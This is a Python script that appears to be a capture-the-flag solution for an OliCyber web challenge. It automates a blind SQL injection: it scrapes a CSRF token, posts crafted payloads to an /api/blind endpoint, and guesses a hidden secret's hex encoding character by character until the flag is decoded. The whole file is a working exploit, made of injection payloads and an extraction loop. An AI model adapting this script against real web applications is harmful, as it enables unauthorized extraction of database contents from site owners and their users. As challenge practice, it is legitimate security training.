import re
import requests

class Inj:
    def __init__(self, url):
        self.url = url
        self.debug = False
        self.session = requests.Session()
        self.csrf_token = None

    def _ensure_csrf(self):
        if self.csrf_token:
            return
        response = self.session.get(self.url, timeout=5)
        response.raise_for_status()
        match = re.search(r"csrf_token\s*=\s*'([^']+)'", response.text)
        if not match:
            raise RuntimeError("CSRF token not found in page HTML")
        self.csrf_token = match.group(1)

    def blind(self, payload):
        try:
            self._ensure_csrf()
            api_url = f"{self.url.rstrip('/')}/api/blind"
            json_payload = {'query': payload}
            headers = {"X-CSRFToken": self.csrf_token}
            response = self.session.post(api_url, json=json_payload, headers=headers, timeout=5)
            if self.debug:
                print("Response text:", response.text)
            data = response.json()
            result = data.get('result', '')
            text_lower = str(result).lower()
            if 'success' in text_lower:
                return 'Success', None
            if 'failure' in text_lower or 'fail' in text_lower:
                return 'Failure', None
            sql_error = data.get('sql_error', '')
            if sql_error:
                return 'Failure', sql_error
            return 'Unknown', None
        except requests.exceptions.RequestException as e:
            return None, str(e)
        
inj = Inj('http://web-17.challs.olicyber.it')
#inj.debug = True  # Enable debug to see responses
dictionary = '0123456789abcdef'
result = ''

print("Starting blind SQL injection...")

while True:
    for c in dictionary:
        question = (
            "1' AND "
            f"(SELECT 1 FROM secret WHERE HEX(asecret) LIKE '{result+c}%')='1" 
            "-- -"
        )
        response, error = inj.blind(question)
        print(f"Trying: {question} -> Response: {response}, Error: {error}")
        if response == 'Success': # We have a match!
            result += c
            print(f"Found: {result}")
            break
    else:
        break # Yup, i cicli for in Python hanno una sezione else.
              # Significa che abbiamo esaurito i caratteri del
              # dizionario.

print(f"\nFinal HEX result: {result}")
if result:
    print(f"Decoded flag: {bytes.fromhex(result).decode('utf-8')}")
